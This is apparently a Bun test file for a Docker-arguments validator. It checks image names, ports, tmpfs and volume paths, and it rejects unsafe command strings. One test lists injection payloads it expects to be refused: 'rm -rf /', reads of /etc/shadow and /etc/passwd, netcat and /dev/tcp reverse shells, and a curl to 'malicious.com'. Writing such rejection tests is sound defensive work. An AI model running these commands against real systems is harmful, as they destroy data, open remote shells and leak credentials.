import { it, expect, describe } from 'bun:test';
import { parseDockerArgsToSchema } from '../src/docker-args-schema';

describe('docker-args-schema', () => {
  it('should image name', () => {
    const dockerImage = 'postgres';
    const result = parseDockerArgsToSchema(dockerImage, '', []);

    expect(result.error).toBeUndefined();
    expect(result.value).toEqual({
      image: dockerImage,
      command: '',
    });
  });

  it('should image name and version', () => {
    const dockerImage = 'postgres:16.1';
    const result = parseDockerArgsToSchema(dockerImage, '', []);

    expect(result.error).toBeUndefined();
    expect(result.value).toEqual({
      image: dockerImage,
      command: '',
    });
  });

  it('should image name and version and repo', () => {
    const dockerImage = 'myrepo/myimage:1.2.3';
    const result = parseDockerArgsToSchema(dockerImage, '', []);

    expect(result.error).toBeUndefined();
    expect(result.value).toEqual({
      image: dockerImage,
      command: '',
    });
  });

  it('should image name and version and repo and host', () => {
    const dockerImage = 'registry.example.com/library/myimage:tag';
    const result = parseDockerArgsToSchema(dockerImage, '', []);

    expect(result.error).toBeUndefined();
    expect(result.value).toEqual({
      image: dockerImage,
      command: '',
    });
  });

  it('should parse docker args to schema', () => {
    const dockerImage = 'postgres:16.1';
    const args = [
      { key: '--publish', value: '8080:8080' },
      { key: '--publish', value: '8081:8081' },
    ];
    const result = parseDockerArgsToSchema(dockerImage, '', args);

    expect(result.error).toBeUndefined();
    expect(result.value).toEqual({
      image: dockerImage,
      publish: ['8080:8080', '8081:8081'],
      command: '',
    });
  });

  it('should parse docker args to schema', () => {
    const dockerImage = 'postgres:16.1';
    const args = [
      { key: '--publish', value: '8080:8080' },
      { key: '--publish', value: '8081:8081' },
      { key: '--tmpfs', value: '/work/temp:size=1g' },
    ];
    const result = parseDockerArgsToSchema(dockerImage, '', args);

    expect(result.error).toBeUndefined();
    expect(result.value).toEqual({
      image: dockerImage,
      publish: ['8080:8080', '8081:8081'],
      command: '',
      tmpfs: '/work/temp:size=1g',
    });
  });

  it('should parse docker args to schema', () => {
    const dockerImage = 'postgres:16.1';
    const args = [
      { key: '--publish', value: '8080:8080' },
      { key: '--publish', value: '8081:8081' },
      { key: '--volume', value: '$BLOCKLET_APP_DIR/path/to/your/storage:/media/frigate' },
    ];
    const result = parseDockerArgsToSchema(dockerImage, '', args);

    expect(result.error).toBeUndefined();
    expect(result.value).toEqual({
      image: dockerImage,
      publish: ['8080:8080', '8081:8081'],
      volume: ['$BLOCKLET_APP_DIR/path/to/your/storage:/media/frigate'],
      command: '',
    });
  });

  it('should parse docker no array', () => {
    const dockerImage = 'postgres:16.1';
    const args = [{ key: '--publish', value: '8080:8080' }];
    const result = parseDockerArgsToSchema(dockerImage, '', args);
    expect(Array.isArray(result.value.publish)).toBe(true);
  });

  it('should parse docker no array', () => {
    const dockerImage = 'postgres:16.1';
    const args = [{ key: '--volume', value: 'a:b' }];
    const result = parseDockerArgsToSchema(dockerImage, '', args);
    expect(Array.isArray(result.value.volume)).toBe(true);
  });

  it('should parse docker volume need $BLOCKLET_APP_DIR or $BLOCKLET_DATA_DIR', () => {
    const dockerImage = 'postgres:16.1';
    const args = [{ key: '--volume', value: '/path/to/your/storage:/media/frigate' }];
    const result = parseDockerArgsToSchema(dockerImage, '', args);
    expect(result.error).toBeDefined();
    expect(result.error?.message.includes('$BLOCKLET_APP_DIR or $BLOCKLET_DATA_DIR')).toBe(true);
  });

  it('should parse docker workdir', () => {
    const dockerImage = 'postgres:16.1';
    const args = [
      { key: '--workdir', value: '/var/path/to/your/storage' },
      { key: '--volume', value: '$BLOCKLET_APP_DIR/path/to/your/storage:/media/frigate' },
    ];
    const result = parseDockerArgsToSchema(dockerImage, '', args);

    expect(result.value).toEqual({
      image: dockerImage,
      command: '',
      workdir: '/var/path/to/your/storage',
      volume: ['$BLOCKLET_APP_DIR/path/to/your/storage:/media/frigate'],
    });
  });

  it('should parse docker command', () => {
    const dockerImage = 'postgres:16.1';
    const args = [
      { key: '--workdir', value: '/var/path/to/your/storage' },
      { key: '--volume', value: '$BLOCKLET_APP_DIR/path/to/your/storage:/media/frigate' },
    ];
    const result = parseDockerArgsToSchema(dockerImage, 'echo "Hello World"', args);
    expect(result.value).toEqual({
      image: dockerImage,
      command: 'echo "Hello World"',
      workdir: '/var/path/to/your/storage',
      volume: ['$BLOCKLET_APP_DIR/path/to/your/storage:/media/frigate'],
    });
  });

  it('should parse docker command', () => {
    const dockerImage = 'postgres:16.1';
    const args = [
      { key: '--workdir', value: '/var/path/to/your/storage' },
      { key: '--volume', value: '$BLOCKLET_APP_DIR/path/to/your/storage:/media/frigate' },
    ];
    const result = parseDockerArgsToSchema(dockerImage, '&& echo "Hello World"', args);
    expect(result?.error?.message).toBe('"command" contains an invalid value');
  });

  it('should error docker command', () => {
    const dockerImage = 'postgres:16.1';
    const args = [
      { key: '--workdir', value: '/var/path/to/your/storage' },
      { key: '--volume', value: '$BLOCKLET_APP_DIR/path/to/your/storage:/media/frigate' },
    ];

    const invalidInputs = [
      '--sse-port 3000 --sse-host 0.0.0.0 PATH -- npx -y @modelcontextprotocol/server-puppeteer',
      '&& aaa',
      '&',
      '|',
      '|| aaa',
      '& aaa',
      '&&Dog',
      '$',
      '$ aaa',
      '$$ aaa',
      ';',
      '@ ',
      '@',
      '| aaa',
      "'",
      '"',
      '`',
      '$DOG',
      'echo $PATH',
      '{',
      '}',
      '(',
      ')',
      '[',
      ']',
      '`',
      '~',
      '~next-\n',
      '\n rm -rf /',
      '\n',
      '\\n',
      '\\\n',
      '\t',
      '\\t',
      '\\\t',
      '!',
      '#',
      '\\ aaaa',
      '> aaaa',
      '< aaaa',
      'ubuntu && rm -rf /',
      'ubuntu||echo test',
      'ubuntu; rm -rf /',
      'ubuntu | grep something',
      'ubuntu `rm -rf /`',
      'ubuntu (rm -rf /)',
      'ubuntu )',
      'ubuntu > /dev/null',
      'ubuntu < /etc/passwd',
      'ubuntu,rm,rf,/', // 包含逗号也不允许
      '$(rm -rf /)',
      '`cat /etc/passwd`',
      '$(echo hacked)',
      ';shutdown -h now',
      'ls; rm -rf /',
      '|| sleep 10',
      '| nc -e /bin/sh 127.0.0.1 4444',
      '$(curl http://malicious.com)',
      '"$(reboot)"',
      '$(eval echo hacked)',
      '$(printf %s "hacked")',
      '$(cat /proc/self/environ)',
      '$(ls -la)',
      '$(id)',
      'rm ',
      '$(touch /tmp/pwned)',
      '$(perl -e "system(\'rm -rf /\')" )',
      '`shutdown now`',
      '$(nc -l -p 1234 -e /bin/bash)',
      '$(bash -i >& /dev/tcp/127.0.0.1/4444 0>&1)',
      '"; sleep 10; echo "',
      '$(rm -rf /) && echo safe',
      '$(cat /etc/shadow)',
      '$(echo $(rm -rf /))',
    ];

    invalidInputs.forEach((cmd) => {
      const result = parseDockerArgsToSchema(dockerImage, cmd, args);
      expect(result?.error?.message).toBe('"command" contains an invalid value');
    });
  });

  it('should parse docker volume', () => {
    const dockerImage = 'postgres:16.1';
    const args = [
      { key: '--workdir', value: '/var/path/to/your/storage' },
      { key: '--volume', value: '/path/to/your/storage:/media/frigate' },
    ];
    const result = parseDockerArgsToSchema(dockerImage, '', args);
    expect(result?.error?.message).toBe('Volume must start with $BLOCKLET_APP_DIR or $BLOCKLET_DATA_DIR');
  });

  it('should parse docker volume', () => {
    const dockerImage = 'postgres:16.1';
    const args = [
      { key: '--workdir', value: '/var/path/to/your/storage' },
      { key: '--volume', value: '$BLOCKLET_APP_DIR/path/to/your/storage:/media/frigate' },
    ];
    const result = parseDockerArgsToSchema(dockerImage, '', args);
    expect(result?.error?.message).toBe(undefined);
  });

  it('should parse docker volume', () => {
    const dockerImage = 'postgres:16.1';
    const args = [
      { key: '--workdir', value: '/var/path/to/your/storage' },
      { key: '--volume', value: '/path/to/your/storage:/media/frigate' },
    ];
    const result = parseDockerArgsToSchema(dockerImage, '', args);
    expect(result?.error?.message).toBe('Volume must start with $BLOCKLET_APP_DIR or $BLOCKLET_DATA_DIR');
  });

  it('should parse docker error path volume ~/', () => {
    const dockerImage = 'postgres:16.1';
    const args = [
      { key: '--workdir', value: '/var/path/to/your/storage' },
      { key: '--volume', value: '~/path/to/your/storage:/media/frigate' },
    ];
    const result = parseDockerArgsToSchema(dockerImage, '', args);
    expect(result?.error?.message).toBe('Volume must start with $BLOCKLET_APP_DIR or $BLOCKLET_DATA_DIR');
  });

  it('should parse docker error path volume ../', () => {
    const dockerImage = 'postgres:16.1';
    const args = [
      { key: '--workdir', value: '/var/path/to/your/storage' },
      { key: '--volume', value: '../path/to/your/storage:/media/frigate' },
    ];
    const result = parseDockerArgsToSchema(dockerImage, '', args);
    expect(result?.error?.message).toBe('Volume must start with $BLOCKLET_APP_DIR or $BLOCKLET_DATA_DIR');
  });

  it('should parse docker allow path volume not path', () => {
    const dockerImage = 'postgres:16.1';
    const args = [
      { key: '--workdir', value: '/var/path/to/your/storage' },
      { key: '--volume', value: 'storage:/media/frigate' },
    ];
    const result = parseDockerArgsToSchema(dockerImage, '', args);
    expect(result?.error?.message).toBe(undefined);
  });

  it('should parse docker allow path multiple volumes', () => {
    const dockerImage = 'postgres:16.1';
    const args = [
      { key: '--workdir', value: '/var/path/to/your/storage' },
      { key: '--volume', value: 'storage:/media/frigate' },
      { key: '--volume', value: 'storage2:/media/frigate2' },
      { key: '--volume', value: '$BLOCKLET_APP_DIR/path/to/your/storage:/media/frigate' },
      { key: '--volume', value: '$BLOCKLET_DATA_DIR/path/to/your/storage:/media/frigate' },
    ];
    const result = parseDockerArgsToSchema(dockerImage, '', args);
    expect(result?.error?.message).toBe(undefined);
  });

  it('parse docker allow path multiple volumes error', () => {
    const dockerImage = 'postgres:16.1';
    const args = [
      { key: '--workdir', value: '/var/path/to/your/storage' },
      { key: '--volume', value: 'storage:/media/frigate' },
      { key: '--volume', value: 'storage2:/media/frigate2' },
      { key: '--volume', value: '/path/to/your/storage:/media/frigate' },
      { key: '--volume', value: '$BLOCKLET_DATA_DIR/path/to/your/storage:/media/frigate' },
    ];
    const result = parseDockerArgsToSchema(dockerImage, '', args);
    expect(result?.error?.message).toBe('Volume must start with $BLOCKLET_APP_DIR or $BLOCKLET_DATA_DIR');
  });
});
